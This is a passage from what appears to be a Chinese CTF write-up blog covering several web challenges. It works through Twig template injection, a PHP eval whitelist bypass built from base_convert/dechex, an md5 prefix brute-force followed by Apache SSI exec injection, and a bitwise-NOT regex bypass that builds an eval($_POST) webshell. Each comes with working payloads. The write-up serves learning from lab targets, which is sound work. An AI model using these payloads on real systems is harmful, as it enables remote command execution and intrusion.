class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/VYY7B6N5IKE3WV71CVL.png"><br>再输入</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>回显为49<br>确定为twig模板<br>RCE</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//css index.php smarty templates_c xff</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>flag在源码中👀</p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>很有意思的题，照着答案+chat分析了很久，长见识了😊</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125; <br></code></pre></td></tr></table></figure><p>这个直接过，一般不会超过80个字符的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure><p>给了个黑名单先不管</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br>    foreach ($used_funcs<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">in</span><span class="hljs-constructor">_array($<span class="hljs-params">func</span>, $<span class="hljs-params">whitelist</span>)</span>) &#123;<br>            die(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure><p>又给了个白名单，if里的意思为得有白名单里的函数</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$used</span>_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">$func</span><br></code></pre></td></tr></table></figure><p>太抽象了，先理解为检索白名单<br>一个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。<br>理想中的传参是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>但是这里的a,b都不是白名单里的，这里替换一下</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><p>这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了<br>看看白名单有什么可以用的函数<br><strong>hex2bin()函数</strong><br>hex2bin()函数把十六进制值的字符串转换为ASCii字符<br>把_GET转化为十六进制<br><img src="/images/DJQB0VOJ373PVHM.png"><br>hex2bin(5f 47 45 54)就是_GET,但是hex2bin()函数也不是白名单里面的，而且这里的5f 47 45 54也不能直接填入，这里会被</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br></code></pre></td></tr></table></figure><p>来进行白名单的检测<br>这里的hex2bin()函数可以通过base_convert()函数来进行转换<br>base_convert()函数能够在任意进制之间转换数字<br>base_convert(37907361743,10,36)等于hex2bin(别问为什么是36进制，问就是这么转换会等于hex2bin😊)<br><img src="/images/ZIZM27JBL9XG2SZ5Y.png"></p><p>里面的5f 47 45 54要用dechex()函数将10进制转换为16进制的数<br>dechex(1598506324),1598506324转换为16进制就是5f 47 45 54<br><img src="/images/QEKBJT3PLILCFXS6L7BG.png"></p><p>payload</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">/?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/B5YT537OKAX6WR7R5O.png"><br>flag出来了，再详细分析下<br>从前往后</p><p>base_convert(37907361743,10,36)-&gt;hex2bin</p><p>dechex(1598506324)-&gt;5f 47 45 54</p><p>$pi&#x3D;hex2bin(5f 47 45 54)-&gt;$pi&#x3D;_GET</p><p>管道符;连接</p><p>($$pi){pi}(($$pi){abs})</p><p>($_GET){pi}(($_GET){abs})</p><p>这个表达式实际上会尝试执行$_GET(pi)($_GET(abs))</p><p>所以此时c的值为c&#x3D;_GET$_GET(pi)($_GET(abs))</p><p>后面有对pi和abs赋值，带入</p><p>c&#x3D;system(cat &#x2F;flag)</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>好简单，就藏在源代码里<br><img src="/images/IB0WVFS4XJ9N847G.png"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>并不是sql注入和xss<br>一定要注意题目给的提示<br>输入username和password，可以看到是以GET方式发送的<br>获取关键词cookie<br>尝试用cookie登录<br><img src="/images/DAMXIM6X4N91NEI.png"><br>&amp;password&#x3D;123多余了<br>去掉试试<br><img src="/images/FZ806UV2QR1V9VG2.png"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>sql注不出来，查看源码也没有什么有效的信息<br>用dirsearch扫一扫<br>没有扫出什么东西，可能是我的dirsearch太低级了<br>看了下别人的博客，dirsearch扫出了index.php.swp<br>找到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-built_in">substr</span>(<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;password&#x27;</span>]</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>))<br></code></pre></td></tr></table></figure><p>没有绕过方法，写一个python脚本</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;6d0bc1&quot;</span>)<br></code></pre></td></tr></table></figure><p>得出为2020666<br>输入</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">2020666</span>&amp;username=admin<br></code></pre></td></tr></table></figure><p>页面发出警告说明已经通过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">$file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>          $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>          $text = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">***&#x27;</span>;<br>          fwrite($shtml,$text);<br>          fclose($shtml);<br></code></pre></td></tr></table></figure><p>这里的get_hash()值是不可能求出来的，只能找出来，再在页面上找找<br><img src="/images/MUW7PLXTC8KCQ5YHP.png"></p><p><img src="/images/NLRFZRXO510E.png"><br>看到client ip就想xff一下，可惜x不了<br>这题的思路是利用”Apache SSI远程命令执行漏洞”<br><a href="https://www.cnblogs.com/yuzly/p/11226439.html">Apache SSI 远程命令执行漏洞复现</a><br>页面回显了username，password不能动<br>看到.shtml后缀，我们就可以利用一下<br>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行命令。<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p>进入新生成的url查看<br><img src="/images/ZJ4P7M6GGO.png"><br>这么多的链接，要试到猴年马月<br>去根目录看看<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p><img src="/images/EP83OM9ZY8K5GK.png"><br>没有，那上一级看看<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p><img src="/images/MHS82ETVEKT1RC6.png"><br>看到位置直接cat<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p><img src="/images/CVZTGYF5UOP7U2YGKY.png"></p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>这题源码非常简单，就是要绕过正则表达式来执行命令，不能使用换行符来绕过，要使用php异或操作即可绕过或通过url编码绕过<br>但是。。。<br>还是没有这么简单，本题主要内容是disable_function禁用了大量的函数导致shell上传成功但无法使用的情况出现使得难度大大提高<br>先取反绕过<br>取反操作如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><br>&gt;<br>payload<br>?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure><p>查看phpinfo</p><p>搓一个shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[a]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br><span class="hljs-meta">?&gt;</span><br>在PHP中，~ 是按位取反运算符，而用url编码是避免不可见字符<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;D&quot;</span>^<span class="hljs-string">&quot;C&quot;</span>                  